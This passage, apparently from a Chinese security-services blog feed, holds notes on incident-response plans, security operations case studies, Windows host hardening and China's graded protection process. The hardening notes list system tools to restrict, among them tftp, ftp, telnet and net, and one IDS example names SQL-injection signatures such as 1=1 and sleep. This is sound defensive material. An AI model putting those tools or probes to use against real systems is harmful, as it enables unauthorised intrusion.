培训目的是什么</h4><ul><li>了解安全事件闭环管理流程及相关活动</li><li>提高安全事件处置规范性及效率</li><li>明确护网期间安全事件处置工作内容</li><li>更好的协助客户及远程团队完成安全事件处置</li></ul><h4 id="什么是应急预案"><a class="markdownIt-Anchor" href="#什么是应急预案"></a> 什么是应急预案</h4><ul><li>是法律法规的必要补充，是从常态向非常态转变的工作方案，目的是在既有的制度安安排下尽量提高应急反应速度</li><li>对应急组织体系与职责、人员、技术、指挥与协调等预先做好具体安排，明确在突发事件发生之前，发生过程中以及刚刚结束之后，谁来做，做什么，何时做，以及相应的处置方法和资源准备</li><li>重点规范必要的监测预警和必要的应急恢复</li><li>是立足于现有资源的对应方案，主要使<mark>应急资源找得到，调得好，用得好</mark>，而不是能力建设的实施方案</li></ul><h5 id="应急预案分类"><a class="markdownIt-Anchor" href="#应急预案分类"></a> 应急预案分类</h5><ul><li>总体应急预案<ul><li>基础环境类专项预案<ul><li>《机房电力中断专项应急预案》</li><li>《突发消防事件专项应急预案》</li><li>…</li></ul></li><li>业务系统类专项预案<ul><li>《4S店网络开票系统专项应急预案》</li><li>《运输发票税控系统专项应急预案》</li><li>…</li></ul></li><li>安全事件类专项预案<ul><li>《DDOS攻击事件专项应急预案》</li><li>《计算机病毒事件专项应急预案》</li><li>…</li></ul></li><li>其他类专项预案<ul><li>特殊事件及其他不属于以上三类的预案</li></ul></li></ul></li></ul><h5 id="如果客户没有应急预案怎么办"><a class="markdownIt-Anchor" href="#如果客户没有应急预案怎么办"></a> 如果客户没有应急预案怎么办</h5><ul><li>常见表现<ul><li>内部人员分工不明确，可能只有一个接口人</li><li>无安全事件处置、汇报流程</li><li>无安全事件报告、处置模板</li></ul></li><li>做好几个工作<ol><li>安全事件监控和收集</li><li>对安全事件进行初步分析和确认</li><li>确认是否可以独立处置</li><li>详细做好事件记录</li><li>及时汇报接口人</li><li>事件处置或协助处置</li><li>完成安全事件处置报告</li></ol></li></ul><h5 id="安全事件无法解决怎么办"><a class="markdownIt-Anchor" href="#安全事件无法解决怎么办"></a> 安全事件无法解决怎么办</h5><ul><li>事件现象：异常登录，发现webshell，数据泄露等等</li><li>事件类型：远程代码执行，弱口令攻击，任意文件上传等等</li><li>发生时间：事件发生时间</li><li>影响目标：业务系统，主机</li><li>攻击结果：包括攻击者目前所得权限，当前的具体损失（有形和无形资产）、具体哪些数据被窃、被毁、被篡改等</li><li>客户需求：遏制，排查，溯源</li><li>处置方式：远程，现场</li><li>日志收集：中间件日志，系统日志，安全设备日志</li><li>权限需求：目标服务器登录用户名，密码</li><li>联系人：客户接口人，系统/主机管理员</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全运维</title>
      <link href="/2020/12/04/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/"/>
      <url>/2020/12/04/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="安全运维服务介绍"><a class="markdownIt-Anchor" href="#安全运维服务介绍"></a> 安全运维服务介绍</h1><ul><li>通过采用合适的安全技术、安全管理措施、安全设备和既定规则，对网络和信息系统进行有效的防护</li><li>做到事前预知、实时告知、有效处理、灾难恢复、持续改进</li><li>安全运维服务分为：驻场运维服务、安全巡检服务两种<ul><li>驻场运维服务<ul><li>基本概念<ul><li>指派安全技术人员与客户指定场所现场办公地点，进行安全设备监控、安全巡检、安全日志分析、应急处置等与运维相关的工作有专业的人员从事专业工作，最大化节省客户人力资源成本，充分保障客户IT系统、网络及业务的顺畅运行</li></ul></li><li>服务的必要性<ul><li>驻场运维是日常IT运维团队解决安全问题的一种很好的补充，特别是在重大国际、国内活动对突发安全事件需要快速解决处理的场景中，往往能赶到突出作用，同时依据驻场运维工作内容的不同，专业人员往往可以发现一些隐藏的安全风险。例如日志分析中，可能会发现日常隐藏的、潜藏的、不安全的网络、黑客攻击行为</li></ul></li><li>服务内容<ul><li>安全设备监控、安全巡检、安全日志分析、应急处置</li></ul></li><li>服务特点<ul><li>驻场运维侧重于最大化利用专业资源，将复杂、综合的安全技术工作交给专职的技术人员，更好的提高投入产出效益</li></ul></li><li>服务报告<ul><li>日报、周报、月报、年度报告等</li></ul></li></ul></li><li>驻场运维服务流程<ul><li>驻场前准备<ul><li>驻场支持申请-&gt;明确驻场工作内容和范围-&gt;确认时间、地点、联系人-&gt;</li></ul></li><li>驻场值守实施<ul><li>-&gt;根据合同内容，完成现场驻场工作-&gt;</li></ul></li><li>现场驻场报告与汇报<ul><li>-&gt;驻场记录整理-&gt;报告输出与提交-&gt;整体汇报</li></ul></li></ul></li><li>安全巡检服务<ul><li>基本概念<ul><li>使用多种手段，对网络设备、服务器、操作系统、应用系统进行周期性状态检查、安全扫描、日志分析、补丁管理并提交巡检报告及安全建议</li></ul></li><li>服务的必要性<ul><li>定期的安全巡检是日常IT运维中重要的一环，因为安全漏洞会不断出现，通过安全巡检能够发现新出现的漏洞，同时通过补丁安装修补漏洞。通过安全状态检查和版本更新，能够使网络安全设备一直处于良好运行状态，通过日志分析能够发现网络中的异常事件，根据异常事件的特点进行对应的安全策略降低安全威胁。安全巡检服务可以周期性的对目前整体的网络状态包括网络设备、服务器设备等进行快速、简易的周期性安全评估，对了解、掌握目前网络、系统安全状况和风险防范起到了积极的推动作用</li></ul></li><li>服务内容<ul><li>安全设备状态检查、安全漏洞扫描、安全日志分析、补丁管理等</li></ul></li><li>服务特点<ul><li>全程化服务，有效保证服务质量、专家级解决方案，一切以解决问题为目标、降低成本，节省投资</li></ul></li><li>服务报告<ul><li>《XX系统安全巡检报告》、《XX月度、季度安全巡检报告》等</li></ul></li></ul></li><li>安全巡检服务流程<ul><li><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201127103009618.png" alt="image-20201127103009618" /></li></ul></li></ul></li></ul><h1 id="安全运维服务内容"><a class="markdownIt-Anchor" href="#安全运维服务内容"></a> 安全运维服务内容</h1><ul><li>漏洞扫描<ul><li>准备阶段<ul><li>前期技术交流-&gt;确定扫描范围、目标-&gt;确定扫描方案-&gt;</li></ul></li><li>扫描过程<ul><li>-&gt;漏洞扫描实施-&gt;漏洞分析-&gt;漏洞验证-&gt;</li></ul></li><li>汇报阶段<ul><li>扫描数据整理</li><li>提交漏洞扫描报告</li><li>内容沟通</li></ul></li></ul></li><li>配置核查<ul><li>服务方式：本地登录系统</li><li>服务工具：配置核查系统、绿盟科技安全配置检查checklist</li><li>服务内容：抽样检查系统的策略配置、服务配置、保护措施以及系统和软件升级、更新情况，是否存在漏洞或后门等</li><li>输出文档：配置检查报告</li></ul></li><li>渗透测试<ul><li>服务方式：工具测试、手工验证</li><li>服务工具：APPScan、burpsuite、Nmap等</li><li>测试流程：收集扫描对象信息，使用扫描工具对扫描对象进行扫描探测，对扫描出来的漏洞进行验证，能力强经验多的工程师也可以手工进行漏洞挖掘</li><li>输出文档：渗透测试报告</li></ul></li><li>网络架构分析<ul><li>采集资料<ul><li>了解网络安全状况</li></ul></li><li>架构分析<ul><li>分析安全防范短板</li></ul></li><li>问题反馈<ul><li>网络架构分析报告</li></ul></li><li>结构整改<ul><li>充分满足合规要求</li></ul></li></ul></li><li>安全加固<ul><li>加固项目<ul><li>漏洞修复</li><li>文件系统权限增强</li><li>防DDOS攻击增强</li><li>访问控制策略增强</li><li>认证和授权策略调整</li><li>系统权限增强</li><li>网络与服务加固</li><li>日志审核功能增强</li><li>账号和口令加固</li><li>剩余信息保护</li></ul></li><li>输出报告<ul><li>安全加固报告</li></ul></li></ul></li><li>设备巡检<ul><li>检查方式<ul><li>本地登录系统</li></ul></li><li>检查内容<ul><li>检查设备CPU、内存、硬盘、接口、服务和证书等是否正常，检查完后填写设备检查表</li></ul></li><li>设备升级<ul><li>检查设备引擎、规则库、URL分类库、病毒特征库等是否有更新，设备设置自动升级或手动到官网下载升级包升级，设置升级需要经过客户同意方可进行</li></ul></li><li>输出文档<ul><li>设备巡检报告</li></ul></li></ul></li><li>日志分析<ul><li>分析方式<ul><li>登录设备导出日志</li></ul></li><li>日志分析<ul><li>筛选其中<mark>高、中风险</mark>事件，查看告警事件的详细信息，根据源地址、目的地址、端口、所属区域及触发的操作等分析该事件是否属于攻击事件，查看是否有删除、修改、上传等动作，验证操作是否成功，是否对系统造成影响</li></ul></li></ul></li><li>网站安全监测<ul><li>漏洞扫描<ul><li>深入检测web应用，直观呈现网站漏洞风险</li></ul></li><li>挂马监测<ul><li>检索web应用各个页面，挖掘隐藏木马</li></ul></li><li>敏感内容监测<ul><li>监测站点敏感内容，避免法律风险</li></ul></li><li>域名监测<ul><li>及时发现域名解析异常，保障网站可正常访问</li></ul></li><li>性能监测<ul><li>监测站点运营状况，提升访问者满意度</li></ul></li><li>篡改监测<ul><li>未雨绸缪，预防恶意篡改，维护开锅和公信力</li></ul></li><li>钓鱼监测<ul><li>及时发现、屏蔽、关停钓鱼站点，保护访问者利益</li></ul></li><li>输出报告：网站监测记录</li></ul></li><li>应急响应<ul><li>服务方式<ul><li>一次性服务</li><li>远程服务</li><li>单次服务</li><li>年度服务</li></ul></li><li>服务内容<ul><li>网络阻塞、DDOS攻击问题</li><li>恶意入侵、黑客攻击问题</li><li>病毒爆发问题</li><li>内部安全事故</li></ul></li><li>成果流程<ul><li>事件响应</li><li>应急响应实施</li><li>输出应急处置报告</li></ul></li><li>应急响应流程<ul><li><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201127111607420.png" alt="image-20201127111607420" /></li></ul></li></ul></li></ul><h1 id="安全运维体系"><a class="markdownIt-Anchor" href="#安全运维体系"></a> 安全运维体系</h1><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201127113257415.png" alt="image-20201127113257415" /></p><p>安全技术支撑：预防P、发现D、恢复R</p><p>安全监控和基础维护：响应R</p><ul><li>安全监控和基础维护</li><li>集中的安全技术支撑队伍</li><li>围绕“积极预防、及时发现、积极响应、确认恢复”四个环节，形成分层、闭环的维护体系</li><li>锻造一支专业的网络与信息安全队伍</li></ul><h1 id="安全运维管理"><a class="markdownIt-Anchor" href="#安全运维管理"></a> 安全运维管理</h1><p>安全目标遵循的PDCA闭环执行过程</p><ul><li>PLAN<ul><li>安全目标要求–安全现状</li><li>安全计划–（建设，维护等）</li></ul></li><li>DO<ul><li>安全项目建设</li><li>安全维护作业<ol><li>更新资产补丁\拓扑\服务等状态</li><li>安全事件通报</li><li>安全加固</li><li>更新安全现状和安全目标要求差距</li><li>其他</li></ol></li></ul></li><li>CHECK<ul><li>日常安全检查</li><li>周期性安全评估<ol><li>检查安全目标要求的完成状态</li><li>评估安全状况（资产状态，弱点状态）</li><li>安全现状是否符合可控安全环境</li></ol></li></ul></li><li>ACTION<ul><li>调整安全目标要求</li><li>规划安全项目</li><li>绩效考核各个部门、安全管理员</li></ul></li></ul><h1 id="安全运维目标"><a class="markdownIt-Anchor" href="#安全运维目标"></a> 安全运维目标</h1><ul><li>高效管理能力</li><li>全面运维能力</li><li>安全保护能力</li><li>隐患发现能力</li><li>应急响应能力</li><li>快速恢复能力</li></ul><h1 id="安全运维实例"><a class="markdownIt-Anchor" href="#安全运维实例"></a> 安全运维实例</h1><h2 id="实例一"><a class="markdownIt-Anchor" href="#实例一"></a> 实例一</h2><h3 id="设备硬件故障"><a class="markdownIt-Anchor" href="#设备硬件故障"></a> 设备硬件故障</h3><ul><li>问题描述<ul><li>ESPC显示XXIDS设备不在线</li></ul></li><li>诊断过程<ul><li>找到可直连该设备的终端，ping该设备并尝试使用网页登陆该设备，发现无法ping通，且登录不了设备网页界面。联系网络运维人员确认不是他们变更导致，初步确认设备连接问题或设备故障</li></ul></li><li>汇报情况<ul><li>将设备无法监控且不能连接的情况电话告知部门负责人（发现时间、故障现象描述、分析判断），并根据应急预案提供处理建议，（设备不在线且无法连接的问题需要行内人员进机房进行查看设备状态，查看端口连接情况，必要时进行重启操作）</li></ul></li><li>配合处理<ul><li>配合相关人员进行设备验证，设备下架、配置导入、设备上架、更换等操作，完成设备故障特殊事件报告</li></ul></li></ul><h2 id="实例二"><a class="markdownIt-Anchor" href="#实例二"></a> 实例二</h2><h3 id="设备配置问题"><a class="markdownIt-Anchor" href="#设备配置问题"></a> 设备配置问题</h3><ul><li><p>问题描述</p><ul><li>头天变更，设备重启，交接班时发现ADS-M设备显示设备状态正常，登陆单台ADS显示BGP（邻居）状态正常，当前服务为空</li></ul></li><li><p>诊断过程</p><ul><li>查看NTA设备，发现路由状态异常（红色），其他服务正常。根据经验判断该问题是因为重启后路由没有得到释放，无法连接</li></ul></li><li><p>汇报情况</p><ul><li>根据应急预案内容，自行删除路由，再添加路由。暂不汇报</li></ul></li><li><p>配合处理</p><ul><li>自主删除路由后再添加路由（最好复制，但注意空白字符），等待2分钟后，设备服务状态正常</li></ul><p><strong>注</strong>：这类问题经常由于变更人员进行变更操作后只看设备是否能登录并在线监控，未检查联通性造成的。是否上报酌情处理</p></li></ul><h2 id="实例三"><a class="markdownIt-Anchor" href="#实例三"></a> 实例三</h2><h3 id="ids告警事件"><a class="markdownIt-Anchor" href="#ids告警事件"></a> <strong>IDS告警事件</strong></h3><ul><li>问题描述<ul><li>IDS设备触发告警，告警量大（15秒出现1000条以上）</li></ul></li><li>诊断过程<ul><li>查看告警内容，发现是针对xx系统的扫描包含注入特征码（1=1/1=2/sleep/select等），查看外部渗透扫描申请表，确认不是已备案的渗透测试/扫描服务，属于外部攻击</li></ul></li><li>汇报情况<ul><li>根据应急预案内容，自行处理，暂不汇报，上交特殊事件报告就行。（经过地址反查如果是领导特别关心的源IP或目的IP根据指示汇报）</li></ul></li><li>配合处理<ul><li>根据应急预案内容，封禁该IP对本机的访问。封禁后告警停止。编写特殊事件报告。完成日志分析，抽取告警进行还原操作（HOST+URL+？+参数），确认是否存在问题。联系相关人员确认系统是否运行正常</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全加固</title>
      <link href="/2020/12/04/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
      <url>/2020/12/04/%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="安全加固三阶段"><a class="markdownIt-Anchor" href="#安全加固三阶段"></a> 安全加固三阶段</h1><h2 id="准备阶段"><a class="markdownIt-Anchor" href="#准备阶段"></a> 准备阶段</h2><p>输入：项目负责人、项目类型、项目资产情况及加固范围、联系人及联系方式、漏扫和配置核查扫描、资产列表及IP地址</p><p>输出：安全加固方案</p><p>流程：<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201125092159107.png" alt="image-20201125092159107" /></p><h2 id="实施阶段"><a class="markdownIt-Anchor" href="#实施阶段"></a> 实施阶段</h2><p>输入：用户名、配合人员、加固手册</p><p>输出：安全加固日志</p><p>流程：<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201125092254776.png" alt="image-20201125092254776" /></p><h2 id="汇报阶段"><a class="markdownIt-Anchor" href="#汇报阶段"></a> 汇报阶段</h2><p>输入：无</p><p>输出：安全加固报告</p><p>流程：<img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201125092330035.png" alt="image-20201125092330035" /></p><h1 id="加固类别"><a class="markdownIt-Anchor" href="#加固类别"></a> 加固类别</h1><h2 id="网络设备"><a class="markdownIt-Anchor" href="#网络设备"></a> 网络设备</h2><ul><li>CISCO</li><li>华为</li><li>防火墙</li><li>安全设备配置建议</li></ul><h2 id="操作系统"><a class="markdownIt-Anchor" href="#操作系统"></a> 操作系统</h2><ul><li>Windows</li><li>AIX</li><li>Solaris</li><li>Linux</li></ul><h2 id="数据库"><a class="markdownIt-Anchor" href="#数据库"></a> 数据库</h2><ul><li>Oracle</li><li>MS SQL</li><li>MySQL</li><li>DB2</li></ul><h2 id="中间件"><a class="markdownIt-Anchor" href="#中间件"></a> 中间件</h2><ul><li>weblogic</li><li>WebSphere</li><li>Apache</li><li>Tomcat</li></ul><h1 id="加固项目"><a class="markdownIt-Anchor" href="#加固项目"></a> 加固项目</h1><h2 id="账号管理"><a class="markdownIt-Anchor" href="#账号管理"></a> 账号管理</h2><ul><li>账号分配管理：避免共享账号</li><li>多余账号锁定：锁定无关账号远程登录</li><li>root账户远程登录锁定*等</li></ul><h2 id="口令配置"><a class="markdownIt-Anchor" href="#口令配置"></a> 口令配置</h2><ul><li>口令复杂度要求</li><li>口令生存期要求</li><li>登录失败锁定策略</li></ul><h2 id="认证授权"><a class="markdownIt-Anchor" href="#认证授权"></a> 认证授权</h2><ul><li>用户缺省权限控制*</li><li>关键目录权限控制*</li><li>远程关机授权等</li></ul><h2 id="日志配置"><a class="markdownIt-Anchor" href="#日志配置"></a> 日志配置</h2><ul><li>登录日志记录</li><li>系统事件记录</li><li>远程日志服务器存储等</li></ul><h2 id="设备管理"><a class="markdownIt-Anchor" href="#设备管理"></a> 设备管理</h2><ul><li>SSH安全登录</li><li>本机防火墙设置</li><li>网络安全参数配置等</li></ul><h2 id="其他安全"><a class="markdownIt-Anchor" href="#其他安全"></a> 其他安全</h2><ul><li>登录超时退出</li><li>共享权限要求</li><li>FTP用户权限控制等</li></ul><h1 id="服务流程"><a class="markdownIt-Anchor" href="#服务流程"></a> 服务流程</h1><ul><li>准备阶段：</li></ul><ol><li>前期技术资料收集</li><li>确定加固范围、目标</li><li>确定加固方案</li></ol><ul><li>加固阶段：</li></ul><ol><li>安全加固实施</li><li>加固详细记录（回退）</li><li>安全加固确认</li></ol><ul><li>报告与汇报：</li></ul><ol><li>加固记录整理</li><li>报告输出与提交</li><li>内容沟通</li></ol><h1 id="安全加固实施过程"><a class="markdownIt-Anchor" href="#安全加固实施过程"></a> 安全加固实施过程</h1><h2 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h2><h3 id="windows主机补丁"><a class="markdownIt-Anchor" href="#windows主机补丁"></a> Windows主机补丁</h3><p><strong>补丁检查方法：</strong></p><p>使用XX远程扫描漏洞，或安装微软安全基准分析器Microsoft Baseline Security Analyzer扫描漏洞。</p><h3 id="windows主机补丁安装"><a class="markdownIt-Anchor" href="#windows主机补丁安装"></a> Windows主机补丁安装</h3><p><strong>操作目的：安装系统补丁，修补漏洞</strong></p><p>根据漏洞编号通过官方途径下载补丁进行手动安装。</p><p>补丁安装后可能会影响系统稳定性。</p><h3 id="windows主机账号优化"><a class="markdownIt-Anchor" href="#windows主机账号优化"></a> Windows主机账号优化</h3><p><strong>操作目的：减少系统无用账号，减少风险</strong></p><p>“Win+R”键调出“运行” -&gt;compmgmt.msc（计算机管理） -&gt;本地用户和组，查看是否有不用的账号，系统账号所属组是否正确以及guest账号是否锁定。<br />使用“net user 用户名 /del”命令删除账号<br />使用“net user 用户名 /active:no”命令锁定账号</p><h3 id="windows主机口令策略"><a class="markdownIt-Anchor" href="#windows主机口令策略"></a> Windows主机口令策略</h3><p><strong>操作目的：增强口令的复杂度及锁定策略等，降低被暴力破解的可能性</strong></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201125103743309.png" alt="image-20201125103743309" /></p><h3 id="windows主机服务优化"><a class="markdownIt-Anchor" href="#windows主机服务优化"></a> Windows主机服务优化</h3><p><strong>操作目的：关闭不需要的服务，减少风险</strong></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201125103851069.png" alt="image-20201125103851069" /></p><h3 id="windows主机关闭共享"><a class="markdownIt-Anchor" href="#windows主机关闭共享"></a> Windows主机关闭共享</h3><p><strong>操作目的：关闭默认共享</strong></p><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20201125103941801.png" alt="image-20201125103941801" /></p><h3 id="windows主机网络限制"><a class="markdownIt-Anchor" href="#windows主机网络限制"></a> Windows主机网络限制</h3><p><strong>操作目的：增强文件系统安全性</strong></p><p>查看每个系统驱动器是否使用NTFS文件系统</p><p>建议使用NTFS文件系统，转换命令：convert &lt;驱动器盘符&gt;：/fs：ntfs</p><h3 id="windows主机检查everyone权限"><a class="markdownIt-Anchor" href="#windows主机检查everyone权限"></a> Windows主机检查everyone权限</h3><p><strong>操作目的：增强everyone权限</strong></p><p>鼠标右键系统驱动器（磁盘）-&gt;“属性”-&gt;“安全”，查看每个系统驱动器根目录是否设置为Everyone有所有权限。</p><p>删除Everyone的权限或取消Everyone的写权限</p><h3 id="windows主机限制命令权限"><a class="markdownIt-Anchor" href="#windows主机限制命令权限"></a> Windows主机限制命令权限</h3><p><strong>操作目的：限制部分命令权限</strong></p><p>使用cacls命令或资源管理器查看以下文件权限<br />建议对以下命令做限制，只允许system、 Administrator组访问<br />%systemroot%\system32\cmd.exe<br />%systemroot%\system32\regsvr32.exe<br />%systemroot%\system32\tftp.exe %systemroot%\system32\ftp.exe<br />%systemroot%\system32\telnet.exe %systemroot%\system32\net.exe<br />%systemroot%\system32\net1.exe<br />%systemroot%\system32\cscript.exe<br />%systemroot%\system32\wscript.exe %systemroot%\system32\regedit.exe</p><h3 id="windows主机日志增强"><a class="markdownIt-Anchor" href="#windows主机日志增强"></a> Windows主机日志增强</h3><p><strong>操作目的：增加日志大小，避免由于日志文件容量过小导致日志记录不全</strong></p><p>“Win+R”键调出“运行” -&gt;eventvwr.msc -&gt;“windows日志” -&gt;查看“应用程序”“安全”“系统”的属性。<br />建议设置：日志上限大小： 20480 KB<br />可以在“创建自定义视图中”选择要记录的时间，建议选择：近30天或更长。</p><h3 id="windows主机审核增强"><a class="markdownIt-Anchor" href="#windows主机审核增强"></a> Windows主机审核增强</h3><p><strong>操作目的：对系统事件进行审核，在日后出现故障时用于排查故障</strong></p><p>“Win+R”键调出“运行” -&gt;secpol.msc -&gt;安全设置-&gt;本地策略-&gt;审核策略<br />建议设置：<br />审核策略更改：成功 审核登录事件：成功，失败<br />审核对象访问：成功，失败 审核进程跟踪：成功，失败<br />审核目录服务访问：成功，失败 审核系统事件：成功，失败<br />审核帐户登录事件：成功，失败 审核帐户管理：成功，失败</p><h2 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h2><p>暂无，后续补充</p>]]></content>
      
      
      <categories>
          
          <category> 安全服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>等级保护</title>
      <link href="/2020/11/23/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
      <url>/2020/11/23/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="等级保护步骤"><a class="markdownIt-Anchor" href="#等级保护步骤"></a> 等级保护步骤</h1><ol><li>定级（企业相关定级-专家评审-主管部门审核-公安机关审核）</li><li>备案（企业提交备案材料-公安机关审核-发放备案证明）</li><li>测评（等级测评-三级每年一次）</li><li>建设整改（安全建设-安全整改）</li><li>监督检查（公安机关每年监督检查）</li></ol><h1 id="等级保护实施指南"><a class="markdownIt-Anchor" href="#等级保护实施指南"></a> 等级保护实施指南</h1><p>等级测评过程</p><ul><li>测评准备活动</li></ul><p>等级测评项目启动-&gt;信息收集和分析-&gt;工具和表单准备</p><ul><li>方案编制活动</li></ul><p>测评对象确定，测评指标确定，测评工具接入点确定，测评内容确定，测评指导开发，测评方案编制</p><ul><li>现场测评活动</li></ul><p>现场测评准备-&gt;现场测评和结果记录-&gt;结果确认和资料归还</p><ul><li>分析与报告编制活动</li></ul><p>单项测评结果判定-&gt;单元测评结果判定-&gt;整体测评-&gt;风险分析-&gt;等级测评结论形成-&gt;测评报告报告编制</p><h1 id="保护测评要求"><a class="markdownIt-Anchor" href="#保护测评要求"></a> 保护测评要求</h1><ul><li>测评原则</li></ul><ol><li>客观性原则和公正性原则</li><li>经济性和可用性原则</li><li>可重复性和可再现性原则</li><li>符合性原则</li></ol><ul><li>测评内容</li></ul><p>分为单元测试和整体测评两部分</p><ul><li>测评力度</li><li>结果复用</li><li>使用方法</li></ul><h1 id="定级工作流程"><a class="markdownIt-Anchor" href="#定级工作流程"></a> 定级工作流程</h1><ul><li><strong>开展摸底调研</strong></li></ul><p>需要填写信息系统资产调研表（<mark>安全相关人员、应用软件资产、运维管理终端资产、服务器资产、网络设备资产、安全设备资产、边界联网资产、网络结构拓扑图、安全管理以及被测单位基本信息</mark>）、</p><ul><li><strong>确定定级对象</strong></li><li><strong>确认系统等级</strong></li></ul><p>由<mark>业务、系统等级</mark>通过信息安全保护等级表确定等级</p><ul><li>准备备案材料</li></ul><p>XX单位《信息系统安全等级保护备案表》填表说明、XX单位《信息系统安全等级保护定级报告》说明、《XX单位XX系统-专家评审意见》、【（三级备案时提交）XX单位系统使用的安全产品清单及认证、销售许可证明，《XX单位-信息安全工作管理制度》，单位拓扑图及说明】</p><ul><li><strong>系统等级评审</strong></li></ul><p><strong>专家评审会议准备材料：</strong></p><p>XX单位《信息系统安全等级保护定级报告》，XX单位《信息系统安全等级保护备案表》，《XX单位XX系统-专家评审意见》，《XX单位XX系统专家评审PPT》</p><ul><li><strong>系统等级确认</strong></li></ul><p><strong>专家评审会议：</strong></p><p>l若专家认为系统等级与实际不符，则需要对系统定级进行调整；</p><p>l若对系统等级未提出异议而对定级报告或备案表提出建议，则需要根据专家建议对备案材料进行修订。</p><ul><li><strong>信息系统备案</strong></li></ul><p><strong>备案流程</strong>：</p><p>l电话联系网安，确认备案材料以及备案流程；</p><p>l协助客户注册等保备案预约平台账号；</p><p>l等待账号注册结果；</p><p>l在等保备案预约平台上传备案材料；</p><p>l等待网上审核结果（通过则由受理备案网安通过邮件等方式通知备案单位/客户领取备案证明，不通过则需要根据问题描述进行修订，重新上传，直到审核通过）</p><ul><li><strong>领取备案证明</strong></li></ul><h1 id="gbt-28448-2019-信息安全技术-网络安全等级保护测评要求"><a class="markdownIt-Anchor" href="#gbt-28448-2019-信息安全技术-网络安全等级保护测评要求"></a> GB/T 28448-2019 信息安全技术 网络安全等级保护测评要求</h1><h2 id="1-范围"><a class="markdownIt-Anchor" href="#1-范围"></a> 1、范围</h2><p>本标准规定了网络安全等级保护的第一级到第四级等级保护对象的安全通用要求和安全拓展要求（不适用涉密对象）</p><h2 id="2-规范性引用文件"><a class="markdownIt-Anchor" href="#2-规范性引用文件"></a> 2、规范性引用文件</h2><ul><li>GB 17859 计算机信息系统 安全保护等级划分准则</li><li>GB/T 22240 信息安全技术 信息系统安全等级保护定级指南</li><li>GB/T 25069 信息安全技术 术语</li><li>GB/T31167—2014 信息安全技术 云计算服务安全指南</li><li>GB/T31168—2014 信息安全技术 云计算服务安全能力要求</li><li>GB/T32919-2016 信息安全技术 工业控制系统安全控制应用指南</li></ul><h2 id="3-术语和定义"><a class="markdownIt-Anchor" href="#3-术语和定义"></a> 3、术语和定义</h2><h2 id="4-等保概述"><a class="markdownIt-Anchor" href="#4-等保概述"></a> 4、等保概述</h2><h3 id="41等保对象"><a class="markdownIt-Anchor" href="#41等保对象"></a> 4.1等保对象</h3><p>等级保护对象是指网络安全等级保护工作中的对象，通常是指由计算机或其他信息终端及相关设备组成的按照一定规则和程序对信息进行收集、存储、传输、交换、处理的系统，主要包括==基础信息网络、云计算平台（系统）、大数据应用（平台|资源）、物联网（IOT）、工业控制系统和采用移动互联技术的系统等。</p><h3 id="42不同级别的安全保护能力"><a class="markdownIt-Anchor" href="#42不同级别的安全保护能力"></a> 4.2不同级别的安全保护能力</h3><p>不同级别的等级保护对象应具备的基本安全保护能力如下:</p><ul><li>第一级安全保护能力:应能够防护免受来自个人的、拥有很少资源的威胁源发起的恶意攻击、一般的自然灾难,以及其他相当危害程度的威胁所造成的关键资源损害﹐在自身遭到损害后,能够恢复部分功能。</li><li>第二级安全保护能力:应能够防护免受来自外部小型组织的、拥有少量资源的威胁源发起的恶意攻击、一般的自然灾难,以及其他相当危害程度的威胁所造成的重要资源损害﹐能够发现重要的安全漏洞和处置安全事件,在自身遭到损害后﹐能够在一段时间内恢复部分功能。</li><li>第三级安全保护能力:应能够在统一安全策略下防护免受来自外部有组织的团体、拥有较为丰富资源的威胁源发起的恶意攻击、较为严重的自然灾难,以及其他相当危害程度的威胁所造成的主要资源损害,能够及时发现、监测攻击行为和处置安全事件,在自身遭到损害后﹐能够较快恢复绝大部分功能。</li><li>第四级安全保护能力:应能够在统一安全策略下防护免受来自国家级别的,敌对组织的.拥有丰富资源的威胁源发起的恶意攻击、严重的自然灾难,以及其他相当危善程度的威胁所造成的资源损害﹐能够及时发现、监测发现攻击行为和安全事件,在自身遭到损害后﹐能够迅速恢复所有功能。</li><li>第五级安全保护能力:略。</li></ul><h3 id="43安全通用要求和安全拓展要求"><a 